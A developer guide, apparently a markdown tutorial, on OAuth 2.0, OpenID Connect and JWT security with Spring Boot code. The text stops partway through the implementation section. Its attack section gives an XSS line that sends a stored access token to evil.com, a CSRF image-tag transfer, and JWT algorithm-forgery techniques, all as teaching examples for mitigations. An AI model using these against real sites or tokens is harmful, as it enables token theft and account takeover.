# API Security: OAuth 2.0, OIDC, JWT — From Fundamentals to Senior-Level Mastery

> A complete production-grade guide for Java backend developers. Every concept includes WHY it exists, HOW it works internally, WHEN to use it, and WHEN NOT to use it.

---

## Table of Contents

1. [Security Fundamentals](#1-security-fundamentals)
2. [OAuth 2.0 Fundamentals](#2-oauth-20-fundamentals)
3. [OAuth 2.0 Flows](#3-oauth-20-flows)
4. [OpenID Connect (OIDC)](#4-openid-connect-oidc)
5. [JWT Deep Dive](#5-jwt-deep-dive)
6. [Token Lifecycle & Management](#6-token-lifecycle--management)
7. [Security Threats & Attacks](#7-security-threats--attacks)
8. [Java + Spring Boot Implementation](#8-java--spring-boot-implementation)
9. [Using Keycloak](#9-using-keycloak)
10. [Securing Microservices](#10-securing-microservices)
11. [Best Practices](#11-best-practices)
12. [Observability & Debugging](#12-observability--debugging)
13. [Real-World Scenarios](#13-real-world-scenarios)
14. [Common Pitfalls](#14-common-pitfalls)
15. [When NOT to Use OAuth2](#15-when-not-to-use-oauth2)
16. [Final Checklist](#16-final-checklist)

---

## 1. Security Fundamentals

### 1.1 Authentication vs Authorization

These two concepts are routinely confused, but they are fundamentally different problems.

**Authentication** answers: *Who are you?*
- It verifies identity — proving you are who you claim to be.
- Examples: password login, biometric scan, API key check.

**Authorization** answers: *What are you allowed to do?*
- It verifies permission — checking what actions an authenticated identity may perform.
- Examples: RBAC (role-based access control), scopes, ACLs.

**Why the distinction matters**: A system can authenticate a user correctly and still be insecure because authorization is broken. Most real-world breaches exploit authorization flaws (IDOR, privilege escalation), not broken authentication.

```
Request → [Authentication] → Who is this? → Verified identity
        → [Authorization]  → What can they do? → Permitted action
```

### 1.2 Identity vs Access

| Concept | What it represents | Token type |
|---|---|---|
| Identity | Who the user is (name, email, roles) | ID Token (OIDC) |
| Access | What the user can do | Access Token (OAuth2) |

**Mental model**: Your passport proves identity. Your hotel key card grants access. They solve different problems. Mixing them up is a design error.

### 1.3 Stateless vs Stateful Authentication

**Stateful (Session-based)**
- Server creates a session and stores it in memory or a database.
- Client receives a session ID (cookie).
- Every request, the server looks up the session to verify the user.
- **Problem**: Doesn't scale horizontally without shared session storage (Redis, DB). Session stores become bottlenecks.

```
Client → [Login] → Server creates Session(id=abc, user=alice) → Store in DB
Client → [Request + cookie:abc] → Server: "Find session abc" → DB lookup → Allow
```

**Stateless (Token-based)**
- Server issues a signed token containing all the claims needed.
- Client sends the token with every request.
- Server verifies the signature — no DB lookup needed.
- **Problem**: Token cannot be revoked before expiry (requires additional infrastructure).

```
Client → [Login] → Server creates JWT(sub=alice, exp=..., signed) → Return token
Client → [Request + Bearer token] → Server: "Verify signature" → Allow (no DB)
```

**When to use which:**

| Use stateful sessions when | Use stateless tokens when |
|---|---|
| Simple single-server apps | Distributed systems / microservices |
| You need immediate revocation | Tokens are short-lived |
| Server controls the entire stack | Third parties consume your API |

### 1.4 Threat Model — What You're Defending Against

Before writing any security code, define your threat model:

1. **Who are the attackers?** External (internet), internal (employees), compromised clients.
2. **What are the assets?** User data, admin actions, financial records.
3. **What are the attack vectors?** Network interception, token theft, injection, CSRF.
4. **What is the impact?** Data breach, account takeover, unauthorized transactions.

**STRIDE model for API threats:**

| Threat | Example | Mitigation |
|---|---|---|
| **S**poofing | Forging a JWT | Signature verification |
| **T**ampering | Modifying token payload | Signed tokens (RS256) |
| **R**epudiation | Denying an action occurred | Audit logs |
| **I**nformation Disclosure | Token leakage | HTTPS, short expiry |
| **D**enial of Service | Flooding auth endpoints | Rate limiting |
| **E**levation of Privilege | Using low-scope token for admin | Scope enforcement |

### 1.5 Why API Security is Critical

Modern APIs are the attack surface. REST APIs:
- Expose business logic directly
- Are consumed by mobile apps (difficult to patch clients)
- Federate identity across third-party systems
- Are the entry point for automation and integrations

**Top API vulnerabilities (OWASP API Security Top 10):**

1. **Broken Object Level Authorization (BOLA/IDOR)** — accessing other users' resources
2. **Broken Authentication** — weak credential checks
3. **Broken Object Property Level Authorization** — mass assignment, over-exposure
4. **Unrestricted Resource Consumption** — no rate limiting
5. **Broken Function Level Authorization** — accessing admin endpoints as user
6. **Unrestricted Access to Sensitive Business Flows** — scraping, account enumeration
7. **Server Side Request Forgery (SSRF)**
8. **Security Misconfiguration** — open CORS, debug endpoints exposed
9. **Improper Inventory Management** — old API versions active
10. **Unsafe Consumption of APIs** — trusting third-party data without validation

---

## 2. OAuth 2.0 Fundamentals

### 2.1 What OAuth 2.0 Is (and What It Isn't)

OAuth 2.0 is an **authorization framework** — it allows a third-party application to obtain limited access to a resource on behalf of a user, without the user giving their password to the third party.

**OAuth 2.0 is NOT:**
- An authentication protocol (that's OIDC built on top of it)
- A specific implementation (it's a framework with many flows)
- A security protocol in isolation (it relies on TLS/HTTPS)

**The core problem it solves:**

Before OAuth, if you wanted a third-party app (e.g., Trello) to read your Google Calendar, you had to give Trello your Google password. This is terrible because:
- Trello gets full access to your entire Google account
- If Trello is breached, your Google credentials leak
- You can't revoke access without changing your password

OAuth solves this with **delegated authorization**: you tell Google "let Trello read my calendar" — Google issues Trello a limited access token. Trello never sees your password. You can revoke access anytime without changing your password.

### 2.2 The Four Roles

```
+-------------------+       +----------------------+
|  Resource Owner   |       |   Authorization      |
|  (User/Alice)     |       |   Server             |
|                   |       |   (Google Auth)      |
+-------------------+       +----------------------+
         |                           |
         | Grants consent            | Issues tokens
         v                           v
+-------------------+       +----------------------+
|  Client           |       |   Resource Server    |
|  (Trello App)     |<----->|   (Google Calendar   |
|                   | token |    API)              |
+-------------------+       +----------------------+
```

**Resource Owner**: The entity that owns the data. Usually the end user. They can grant or deny access to their resources.

**Client**: The application requesting access. Can be:
- *Confidential client*: Can securely store a secret (server-side app, backend service)
- *Public client*: Cannot securely store a secret (single-page app, mobile app)

**Authorization Server (AS)**: Issues tokens after authenticating the resource owner and obtaining consent. Examples: Keycloak, Auth0, Okta, Google Identity.

**Resource Server (RS)**: The API server hosting protected resources. Validates tokens and enforces access control.

### 2.3 Core OAuth 2.0 Concepts

**Scopes**: String identifiers that represent permissions. `read:emails`, `write:calendar`, `admin:users`. They are requested by the client and granted by the resource owner.

**Access Token**: A credential used to call the Resource Server. Typically short-lived (minutes to hours). Opaque or JWT format.

**Refresh Token**: A long-lived credential used to get new access tokens without user interaction. Stored securely server-side. Never sent to the Resource Server.

**Authorization Code**: A short-lived, one-time-use code exchanged for tokens. Used in the Authorization Code Flow.

**Client ID / Client Secret**: Credentials identifying the Client application to the Authorization Server. The secret must never be exposed in public clients.

---

## 3. OAuth 2.0 Flows

### 3.1 Authorization Code Flow (The Gold Standard)

**Use when**: User-facing web applications, mobile apps (with PKCE).

**Why it exists**: Public clients (browsers, mobile apps) can't safely store client secrets. The code is returned via redirect to the browser and immediately exchanged for tokens server-side (or via PKCE), so tokens never appear in browser history or referrer headers.

#### Step-by-Step Flow

```
User         Browser          Client App        Auth Server        Resource Server
 |               |                 |                  |                  |
 |--Click Login->|                 |                  |                  |
 |               |--Redirect to -->|                  |                  |
 |               |  /authorize     |                  |                  |
 |               |                 |--GET /authorize->|                  |
 |               |                 |  ?client_id=...  |                  |
 |               |                 |  &redirect_uri=..|                  |
 |               |                 |  &scope=openid   |                  |
 |               |                 |  &state=xyz      |                  |
 |               |                 |  &code_challenge=| (PKCE)           |
 |               |<-----------Login Form-----------   |                  |
 |--Enter Creds->|                 |                  |                  |
 |               |---Credentials-->|                  |                  |
 |               |                 |--POST /token---->|                  |
 |               |<----Consent Screen-----------------                   |
 |--Grant access>|                 |                  |                  |
 |               |<--Redirect with code=ABC, state=xyz                   |
 |               |                 |                  |                  |
 |               |--code=ABC------>|                  |                  |
 |               |                 |--POST /token---->|                  |
 |               |                 |  code=ABC        |                  |
 |               |                 |  client_id=...   |                  |
 |               |                 |  client_secret=. |                  |
 |               |                 |  code_verifier=. | (PKCE)           |
 |               |                 |<--access_token---|                  |
 |               |                 |   refresh_token  |                  |
 |               |                 |   id_token       |                  |
 |               |                 |                  |                  |
 |               |                 |--GET /api/data --|--access_token--->|
 |               |                 |                  |                  |
 |               |                 |<-----------------Protected Data-----|
```

#### PKCE (Proof Key for Code Exchange)

PKCE prevents authorization code interception attacks in public clients.

```
1. Client generates a random secret: code_verifier = "dBjftJeZ4CVP..."
2. Client hashes it: code_challenge = BASE64URL(SHA256(code_verifier))
3. Client sends code_challenge in /authorize request
4. Auth Server stores code_challenge alongside the issued code
5. Client sends code_verifier in /token request
6. Auth Server verifies: SHA256(code_verifier) == stored code_challenge
7. If attacker intercepts code, they don't have code_verifier → can't exchange
```

```java
// Generating PKCE in Java
import java.security.MessageDigest;
import java.security.SecureRandom;
import java.util.Base64;

public class PkceUtil {
    public static String generateCodeVerifier() {
        SecureRandom sr = new SecureRandom();
        byte[] code = new byte[32];
        sr.nextBytes(code);
        return Base64.getUrlEncoder().withoutPadding().encodeToString(code);
    }

    public static String generateCodeChallenge(String codeVerifier) throws Exception {
        byte[] bytes = codeVerifier.getBytes("US-ASCII");
        MessageDigest md = MessageDigest.getInstance("SHA-256");
        md.update(bytes, 0, bytes.length);
        byte[] digest = md.digest();
        return Base64.getUrlEncoder().withoutPadding().encodeToString(digest);
    }
}
```

#### The `state` Parameter

The `state` parameter is a CSRF protection mechanism. The client generates a random value, sends it in the `/authorize` request, and verifies it matches the value returned in the redirect. If an attacker initiates an authorization and tricks a victim into completing it, the state won't match.

```java
// Generate state before redirect
String state = UUID.randomUUID().toString();
session.setAttribute("oauth_state", state);

// After redirect back, verify
String returnedState = request.getParameter("state");
String storedState = (String) session.getAttribute("oauth_state");
if (!storedState.equals(returnedState)) {
    throw new SecurityException("State mismatch — possible CSRF attack");
}
```

#### Security Risks

- Redirect URI manipulation: attacker registers a similar URI to steal the code. Mitigation: exact-match redirect URI validation on the AS.
- Code interception: PKCE mitigates this.
- Token leakage via referrer/logs: tokens in URLs appear in browser history and server logs. Mitigation: tokens in POST body or headers, not URL params.

---

### 3.2 Client Credentials Flow

**Use when**: Machine-to-machine (M2M) communication, service-to-service auth, background jobs. No user involved.

```
Client Service           Auth Server           Resource Server
      |                       |                       |
      |--POST /token--------->|                       |
      |  grant_type=          |                       |
      |  client_credentials   |                       |
      |  client_id=svc-a      |                       |
      |  client_secret=...    |                       |
      |  scope=read:orders    |                       |
      |<--access_token--------|                       |
      |                       |                       |
      |--GET /orders ---------------------------------|
      |  Authorization: Bearer <token>                |
      |<----------------------------------------------data
```

```java
// Spring Boot RestTemplate calling token endpoint
RestTemplate restTemplate = new RestTemplate();

MultiValueMap<String, String> params = new LinkedMultiValueMap<>();
params.add("grant_type", "client_credentials");
params.add("client_id", "my-service");
params.add("client_secret", "secret");
params.add("scope", "read:orders");

HttpHeaders headers = new HttpHeaders();
headers.setContentType(MediaType.APPLICATION_FORM_URLENCODED);

HttpEntity<MultiValueMap<String, String>> request = new HttpEntity<>(params, headers);
ResponseEntity<Map> response = restTemplate.postForEntity(
    "https://auth.example.com/token", request, Map.class);

String accessToken = (String) response.getBody().get("access_token");
```

**Security risks**: The client secret is the entire security boundary. Rotate secrets regularly, store in vaults (not env vars or config files), use short-lived tokens.

---

### 3.3 Refresh Token Flow

**Why it exists**: Access tokens are short-lived for security. If an access token leaks, it expires quickly and limits damage. But requiring users to re-login every 15 minutes is terrible UX. Refresh tokens allow obtaining new access tokens silently.

```
Client                  Auth Server
  |                          |
  |--POST /token ----------->|
  |  grant_type=             |
  |  refresh_token           |
  |  refresh_token=<rt>      |
  |  client_id=...           |
  |<--new access_token-------|
  |   new refresh_token      | (rotation)
  |   (old refresh_token     |
  |    is now invalid)       |
```

**Refresh Token Rotation**: Every time a refresh token is used, a new one is issued and the old one is invalidated. If a refresh token is stolen and used by an attacker, the legitimate client's next refresh attempt fails — this signals compromise and the server can invalidate the entire family of tokens.

**Sender-Constrained Refresh Tokens (DPoP)**: Bind the refresh token to a specific client's key pair so it can't be used from a different client even if stolen.

---

### 3.4 Implicit Flow (Deprecated — Do Not Use)

**What it was**: Designed for SPAs before PKCE existed. The access token was returned directly in the redirect URI fragment, skipping the code exchange step.

**Why it's deprecated**:
- Access token appears in browser history, logs, and can leak via `Referer` header.
- No client authentication possible.
- Cannot use refresh tokens safely.

**What to use instead**: Authorization Code Flow with PKCE.

---

### 3.5 Resource Owner Password Credentials (ROPC) Flow (Avoid)

**What it is**: The user gives their username/password directly to the client, which sends them to the Authorization Server.

```
Client → POST /token
  grant_type=password
  username=alice
  password=secret123
  client_id=...
```

**Why to avoid**:
- The client handles the user's password — this defeats the purpose of OAuth (delegated auth without password sharing).
- No support for MFA, SSO, consent screens.
- Makes migration to another identity provider painful.

**When it might be acceptable**: Legacy system migration where you control both the client and the auth server, as a temporary bridge. Never for third-party clients.

---

## 4. OpenID Connect (OIDC)

### 4.1 What OIDC Adds to OAuth 2.0

OAuth 2.0 handles authorization but does not define how to verify who the user is. Engineers started using access tokens for authentication — this is dangerous because access tokens are not designed for this.

OIDC is an identity layer on top of OAuth 2.0. It adds:

1. **ID Token**: A JWT containing identity claims (who the user is).
2. **UserInfo endpoint**: Returns additional user claims.
3. **Standard claims**: `sub`, `name`, `email`, `picture`, etc.
4. **Discovery endpoint**: `/.well-known/openid-configuration` — machine-readable metadata.

### 4.2 The ID Token

The ID Token is a JWT intended for **the client** to verify the user's identity. It is NOT sent to resource servers.

```json
{
  "iss": "https://accounts.google.com",
  "sub": "110169484474386276334",
  "aud": "my-client-id",
  "exp": 1716000000,
  "iat": 1715996400,
  "email": "alice@example.com",
  "email_verified": true,
  "name": "Alice Smith",
  "nonce": "n-0S6_WzA2Mj"
}
```

**Critical ID Token validations the client MUST perform:**
1. `iss` matches the expected issuer.
2. `aud` contains your client_id — prevents token confusion attacks.
3. `exp` is in the future — token not expired.
4. `iat` is not too far in the past — replay protection.
5. `nonce` matches the nonce sent in the authorization request — replay protection.
6. Signature is valid using the AS's public key.

### 4.3 Authentication vs Authorization in OIDC Context

```
OIDC flow returns:
  ├── ID Token    → Tells the CLIENT who the user is (authentication)
  └── Access Token → Tells the RESOURCE SERVER what the client can do (authorization)

NEVER use an ID Token to call an API.
NEVER use an Access Token to determine user identity in your client.
```

### 4.4 Discovery Endpoint

OIDC providers publish their configuration at a well-known URL:

```
GET https://accounts.google.com/.well-known/openid-configuration
```

```json
{
  "issuer": "https://accounts.google.com",
  "authorization_endpoint": "https://accounts.google.com/o/oauth2/v2/auth",
  "token_endpoint": "https://oauth2.googleapis.com/token",
  "userinfo_endpoint": "https://openidconnect.googleapis.com/v1/userinfo",
  "jwks_uri": "https://www.googleapis.com/oauth2/v3/certs",
  "scopes_supported": ["openid", "email", "profile"],
  "response_types_supported": ["code", "token", "id_token"],
  "grant_types_supported": ["authorization_code", "refresh_token"],
  "id_token_signing_alg_values_supported": ["RS256"]
}
```

Spring Boot auto-configures everything from this URL when you provide `spring.security.oauth2.client.provider.xxx.issuer-uri`.

### 4.5 UserInfo Endpoint

After obtaining tokens, the client can call the UserInfo endpoint with the access token to get additional user claims:

```
GET /userinfo
Authorization: Bearer <access_token>

Response:
{
  "sub": "110169484474386276334",
  "name": "Alice Smith",
  "email": "alice@example.com",
  "picture": "https://..."
}
```

---

## 5. JWT Deep Dive

### 5.1 Structure

A JWT is three Base64URL-encoded JSON objects separated by dots:

```
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9
.eyJzdWIiOiJ1c2VyMTIzIiwiaXNzIjoiaHR0cHM6Ly9hdXRoLmV4YW1wbGUuY29tIiwiYXVkIjoiYXBpLmV4YW1wbGUuY29tIiwiZXhwIjoxNzE2MDAwMDAwLCJpYXQiOjE3MTU5OTY0MDAsInNjb3BlIjoicmVhZDpvcmRlcnMgd3JpdGU6b3JkZXJzIiwicm9sZXMiOlsiVVNFUiJdfQ
.SIGNATURE
```

**Header:**
```json
{
  "alg": "RS256",
  "typ": "JWT",
  "kid": "key-id-2024-01"
}
```

**Payload (Claims):**
```json
{
  "sub": "user123",
  "iss": "https://auth.example.com",
  "aud": "api.example.com",
  "exp": 1716000000,
  "iat": 1715996400,
  "jti": "unique-token-id",
  "scope": "read:orders write:orders",
  "roles": ["USER"]
}
```

**Registered Claims:**

| Claim | Name | Description |
|---|---|---|
| `sub` | Subject | User identifier (unique, stable) |
| `iss` | Issuer | Who issued the token |
| `aud` | Audience | Who the token is for |
| `exp` | Expiration | Unix timestamp when token expires |
| `iat` | Issued At | When the token was issued |
| `nbf` | Not Before | Token not valid before this time |
| `jti` | JWT ID | Unique identifier for this token (replay prevention) |

### 5.2 Signing vs Encryption

**Signing (JWS)**: The token is visible to anyone who has it. The signature only proves it hasn't been tampered with. Use when: the payload doesn't contain secrets, and you need the resource server to read claims.

**Encryption (JWE)**: The token payload is encrypted. Only the intended recipient can read it. Use when: the payload contains sensitive data (PII, financial data) that must not be readable by intermediaries.

In practice, 95% of APIs use signed (JWS) tokens. If you need to hide payload data, use JWE or keep sensitive data out of tokens entirely.

### 5.3 Algorithms

**HS256 (HMAC-SHA256) — Symmetric**
- Uses the same secret for signing and verification.
- If the resource server knows the secret, it can also forge tokens.
- Only safe when signing and verifying parties are the same entity.

```
signature = HMACSHA256(
  base64url(header) + "." + base64url(payload),
  shared_secret
)
```

**RS256 (RSA-SHA256) — Asymmetric**
- Auth server signs with private key.
- Resource server verifies with public key (fetched from JWKS endpoint).
- Resource server cannot forge tokens.
- Standard for production systems.

```
signature = RSA_SIGN(
  SHA256(base64url(header) + "." + base64url(payload)),
  private_key
)

verification = RSA_VERIFY(signature, public_key)
```

**ES256 (ECDSA-SHA256) — Asymmetric**
- Same security properties as RS256.
- Smaller signature size (64 bytes vs ~256 bytes for RSA-2048).
- Preferred for mobile and bandwidth-sensitive scenarios.

**Never use `alg: none`**: This disables signature verification entirely. Always reject tokens with `alg: none`.

### 5.4 JWKS (JSON Web Key Set) Endpoint

The Authorization Server publishes its public keys at the JWKS URI. Resource servers fetch and cache these keys to verify token signatures without contacting the AS on every request.

```
GET https://auth.example.com/.well-known/jwks.json

{
  "keys": [
    {
      "kty": "RSA",
      "kid": "key-id-2024-01",
      "use": "sig",
      "alg": "RS256",
      "n": "0vx7agoebGcQSuuPiLJXZptN9nndrQmbXEps2aiAFb...",
      "e": "AQAB"
    }
  ]
}
```

The `kid` (Key ID) in the JWT header matches a key in the JWKS. This enables key rotation without downtime.

### 5.5 Token Validation — What You MUST Check

```java
// Complete JWT validation (conceptual — Spring Security does this for you)
public Claims validateToken(String token) {
    // 1. Parse and verify signature using JWKS
    // 2. Check algorithm is expected (RS256) — NEVER allow "none"
    // 3. Verify issuer
    if (!claims.getIssuer().equals(EXPECTED_ISSUER)) throw new SecurityException();
    // 4. Verify audience — prevents using tokens from other services
    if (!claims.getAudience().contains(EXPECTED_AUDIENCE)) throw new SecurityException();
    // 5. Check expiration
    if (claims.getExpiration().before(new Date())) throw new SecurityException();
    // 6. Check not-before
    if (claims.getNotBefore() != null && claims.getNotBefore().after(new Date())) throw new SecurityException();
    // 7. (Optional) Check jti against revocation list
    return claims;
}
```

### 5.6 The `alg: none` Attack

An attacker can take a valid JWT, change the header to `{"alg": "none"}`, modify the payload (e.g., change `"role": "user"` to `"role": "admin"`), and remove the signature. If the server accepts `alg: none`, the tampered token is accepted.

**Mitigation**: Always specify expected algorithms explicitly. Never accept what the token header says.

```java
// BAD — trusts the algorithm in the token header
Jwts.parser().setSigningKey(key).parseClaimsJws(token);

// GOOD — explicitly specify expected algorithm
Jwts.parserBuilder()
    .setSigningKey(publicKey)
    .requireIssuer("https://auth.example.com")
    .build()
    .parseClaimsJws(token);
```

---

## 6. Token Lifecycle & Management

### 6.1 Access Token Strategy

**Short expiry is your primary defense against token theft.** If an access token leaks, it expires quickly and limits the damage window.

| Environment | Recommended Expiry |
|---|---|
| High-security (banking, healthcare) | 5–15 minutes |
| Standard web apps | 15–60 minutes |
| Internal services | 1–4 hours |
| M2M (low risk) | Up to 24 hours |

### 6.2 Refresh Token Strategy

Refresh tokens are long-lived and must be treated as highly sensitive credentials.

```
Access Token  → Short-lived (15 min), used for API calls
Refresh Token → Long-lived (days/weeks), stored securely, used only to get new access tokens
```

**Refresh token security measures:**
- Store server-side in a secure cookie (HttpOnly, Secure, SameSite=Strict) or encrypted in DB.
- Never return in URL parameters.
- Rotate on every use (detect replay if a token is used twice — means one copy was stolen).
- Bind to client (client_id must match during refresh).
- Absolute expiry (force re-login after e.g. 30 days regardless).

### 6.3 Token Revocation

**The revocation problem**: JWTs are self-contained. The resource server validates them without contacting the AS, so revoking a JWT is not instant.

**Strategies:**

1. **Short expiry**: If tokens expire in 5 minutes, revocation is effectively automatic.

2. **Denylist / Blocklist**: Store revoked `jti` values in a fast cache (Redis). On each request, check if the token's `jti` is in the denylist.
   - Cost: One cache lookup per request.
   - Denylist size: Bounded by token expiry — only need entries until expiry.

3. **Reference tokens**: Issue opaque tokens instead of JWTs. Resource server must call AS to introspect every token.
   - Cost: AS introspection call on every request (mitigate with caching).
   - Benefit: Instant revocation.

4. **Token families**: Used for refresh tokens. A family is a set of tokens issued from the same original refresh. If any family member is used twice (replay), revoke the entire family.

```java
// Redis-based JWT denylist check
@Component
public class TokenDenylistService {
    @Autowired
    private RedisTemplate<String, String> redisTemplate;

    public void revokeToken(String jti, Instant expiry) {
        Duration ttl = Duration.between(Instant.now(), expiry);
        redisTemplate.opsForValue().set("revoked:" + jti, "1", ttl);
    }

    public boolean isRevoked(String jti) {
        return Boolean.TRUE.equals(redisTemplate.hasKey("revoked:" + jti));
    }
}
```

### 6.4 Key Rotation

Authorization servers should rotate signing keys regularly (monthly or quarterly).

**Zero-downtime rotation process:**
1. Generate new key pair, add to JWKS with new `kid`.
2. Start signing new tokens with the new key.
3. Keep old public key in JWKS until all tokens signed with it have expired.
4. Remove old key from JWKS.

Resource servers that cache JWKS should implement cache refresh when they encounter an unknown `kid`:

```java
// If token has unknown kid, refresh JWKS cache and retry once
try {
    return verifyWithCachedKeys(token);
} catch (UnknownKidException e) {
    jwksCache.refresh();
    return verifyWithCachedKeys(token); // retry once
}
```

---

## 7. Security Threats & Attacks

### 7.1 Token Leakage

**Attack**: Access tokens or refresh tokens are exposed to attackers.

**Vectors**:
- Token in URL (appears in browser history, server logs, Referer header)
- Insecure storage (localStorage is XSS-accessible)
- Log injection (token logged in plaintext)
- Accidental commit to git
- Unencrypted HTTP

**Mitigations**:
- Always use HTTPS.
- Never put tokens in URLs (use POST body or Authorization header).
- Store access tokens in memory (JS variable), refresh tokens in HttpOnly cookies.
- Mask tokens in logs: `log.info("Token: {}...{}", token.substring(0,8), token.substring(token.length()-4))`.
- Scan git history and CI secrets with tools like truffleHog, GitGuardian.

### 7.2 Replay Attacks

**Attack**: Intercepting a valid token and reusing it.

**Mitigations**:
- Short expiry limits the replay window.
- `jti` (JWT ID) with server-side tracking prevents exact replay.
- For high-security APIs, use DPoP (Demonstrating Proof-of-Possession) to bind tokens to client key pairs.

### 7.3 CSRF (Cross-Site Request Forgery)

**Attack**: A malicious website triggers an authenticated request to your API from the victim's browser, using the victim's session cookie.

```
1. Victim logs in to bank.com, receives session cookie.
2. Victim visits evil.com.
3. evil.com has: <img src="https://bank.com/transfer?to=attacker&amount=1000">
4. Browser automatically sends bank.com cookie.
5. Transfer executes.
```

**Why CSRF doesn't affect Bearer token APIs**: Bearer tokens must be explicitly added to the Authorization header by JavaScript — browsers don't auto-send them. CSRF exploits automatic cookie sending.

**CSRF is a risk for cookie-based auth**:
- Use `SameSite=Strict` or `SameSite=Lax` cookies.
- Use CSRF tokens (double submit cookie, synchronizer token pattern).
- Verify `Origin` or `Referer` headers server-side.

```java
// Spring Security CSRF configuration
http
    .csrf(csrf -> csrf
        .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())
    );
// Or disable for pure Bearer token APIs:
http.csrf(AbstractHttpConfigurer::disable); // safe if ONLY using Bearer tokens
```

### 7.4 XSS (Cross-Site Scripting)

**Attack**: Injecting malicious JavaScript into your web app that runs in a victim's browser and steals tokens.

```javascript
// Malicious script injected into your app
fetch("https://evil.com/steal?token=" + localStorage.getItem("access_token"));
```

**Mitigations**:
- Never store sensitive tokens in `localStorage` or `sessionStorage` — XSS can read them.
- Store access tokens in memory (JS variables) — XSS can't persist across page loads.
- Store refresh tokens in `HttpOnly` cookies — JavaScript cannot read them.
- Implement strict Content Security Policy (CSP): `Content-Security-Policy: default-src 'self'`.
- Sanitize all user input before rendering.
- Use frameworks that auto-escape output (React, Thymeleaf).

### 7.5 Man-in-the-Middle (MITM)

**Attack**: Intercepting traffic between client and server to steal tokens.

**Mitigations**:
- HTTPS everywhere, no exceptions.
- HSTS (HTTP Strict Transport Security): `Strict-Transport-Security: max-age=31536000; includeSubDomains; preload`
- Certificate pinning for mobile apps (with pin update strategy).
- TLS 1.2 minimum, prefer TLS 1.3.

### 7.6 JWT Confusion Attacks

**Algorithm Confusion (RS256 to HS256)**:
Attack: If a server accepts both RS256 and HS256, an attacker can take the server's RS256 public key, sign a token using it as an HMAC secret, and set `alg: HS256`. The server verifies the HMAC signature using the public key and accepts the forged token.

```java
// ALWAYS specify allowed algorithms explicitly
@Bean
public JwtDecoder jwtDecoder() {
    return NimbusJwtDecoder.withJwkSetUri(jwksUri)
        .jwsAlgorithm(SignatureAlgorithm.RS256) // Only RS256 accepted
        .build();
}
```

**Token Substitution Attack**: Using an ID token as an access token or a token from service A at service B. Mitigated by validating `iss` and `aud` claims.

### 7.7 IDOR (Insecure Direct Object Reference)

**Attack**: Accessing another user's resources by guessing or enumerating resource IDs.

```
GET /api/orders/123     <- your order
GET /api/orders/124     <- someone else's order — if the API doesn't check ownership, this succeeds
```

**Mitigation**: Always validate resource ownership in business logic:

```java
@GetMapping("/orders/{orderId}")
public Order getOrder(@PathVariable Long orderId, @AuthenticationPrincipal JwtAuthenticationToken auth) {
    String userId = auth.getToken().getSubject();
    Order order = orderRepository.findById(orderId)
        .orElseThrow(() -> new ResourceNotFoundException());

    // Critical: verify the requesting user owns this order
    if (!order.getUserId().equals(userId)) {
        throw new AccessDeniedException("Not your order");
    }
    return order;
}
```

---

## 8. Java + Spring Boot Implementation

### 8.1 Dependencies

```xml
<!-- pom.xml -->
<dependencies>
    <!-- Spring Security OAuth2 Resource Server -->
    <dependency>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-security</artifactId>
    </dependency>
    <dependency>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-oauth2-resource-server</artifactId>
    </dependency>

    <!-- OAuth2 Client (for services that call other services) -->
    <dependency>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-oauth2-client</artifactId>
    </dependency>

    <!-- JWT parsing (included transitively, but good to know) -->
    <!-- spring-security-oauth2-jose -->
</dependencies>
```

### 8.2 Resource Server — Validate JWT Access Tokens

**Scenario**: Your API receives requests with Bearer JWT tokens from Keycloak/Auth0.

```yaml
# application.yml
spring:
  security:
    oauth2:
      resourceserver:
        jwt:
          issuer-uri: https://auth.example.com/realms/myrealm
          # Spring auto-fetches JWKS from issuer-uri + /.well-known/openid-configuration
```

```java
@Configuration
@EnableWebSecurity
@EnableMethodSecurity
public class SecurityConfig {

    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/actuator/health", "/api/public/**").permitAll()
                .requestMatchers("/api/admin/**").hasAuthority("SCOPE_admin")
                .anyRequest().authenticated()
            )
            .oauth2ResourceServer(oauth2 -> oauth2
                .jwt(jwt -> jwt.jwtAuthenticationConverter(jwtAuthConverter()))
            )
            // Stateless — no session for token-based APIs
            .sessionManagement(session -> session
                .sessionCreationPolicy(SessionCreationPolicy.STATELESS)
            )
            // Safe to disable for Bearer token APIs
            .csrf(AbstractHttpConfigurer::disable);

        return http.build();
    }

    @Bean
    public JwtAuthenticationConverter jwtAuthenticationConverter() {
        JwtGrantedAuthoritiesConverter grantedAuthoritiesConverter = new JwtGrantedAuthoritiesConverter();
        // Map Keycloak's "roles" claim to Spring Security authorities
        grantedAuthoritiesConverter.setAuthoritiesClaimName("roles");
        grantedAuthoritiesConverter.setAuthorityPrefix("ROLE_");

        JwtAuthenticationConverter jwtAuthenticationConverter = new JwtAuthenticationConverter();
        jwtAuthenticationConverter.setJwtGrantedAuthoritiesConverter(grantedAuthoritiesConverter);
        return jwtAuthenticationConverter;
    }
}
```

### 8.3 Custom JWT Decoder with Audience Validation

```java
@Bean
public JwtDecoder jwtDecoder() {
    NimbusJwtDecoder jwtDecoder = NimbusJwtDecoder
        .withJwkSetUri("https://auth.example.com/.well-known/jwks.json")
        .jwsAlgorithm(SignatureAlgorithm.RS256)
        .build();

    // Add custom validators
    OAuth2TokenValidator<Jwt> withIssuer = JwtValidators.createDefaultWithIssuer(
        "https://auth.example.com/realms/myrealm");

    // Audience validation — CRITICAL to prevent token confusion
    OAuth2TokenValidator<Jwt> withAudience = new JwtClaimValidator<List<String>>(
        JwtClaimNames.AUD,
        aud -> aud != null && aud.contains("my-api")
    );

    jwtDecoder.setJwtValidator(
        new DelegatingOAuth2TokenValidator<>(withIssuer, withAudience)
    );

    return jwtDecoder;
}
```

### 8.4 Accessing the Authenticated User

```java
@RestController
@RequestMapping("/api/orders")
public class OrderController {

    @GetMapping
    public List<Order> getMyOrders(@AuthenticationPrincipal Jwt jwt) {
        String userId = jwt.getSubject();
        String email = jwt.getClaimAsString("email");
        List<String> roles = jwt.getClaimAsStringList("roles");

        return orderService.findByUserId(userId);
    }

    @GetMapping("/{id}")
    public Order getOrder(@PathVariable Long id,
                          @AuthenticationPrincipal Jwt jwt) {
        Order order = orderService.findById(id);
        // Enforce ownership — never skip this
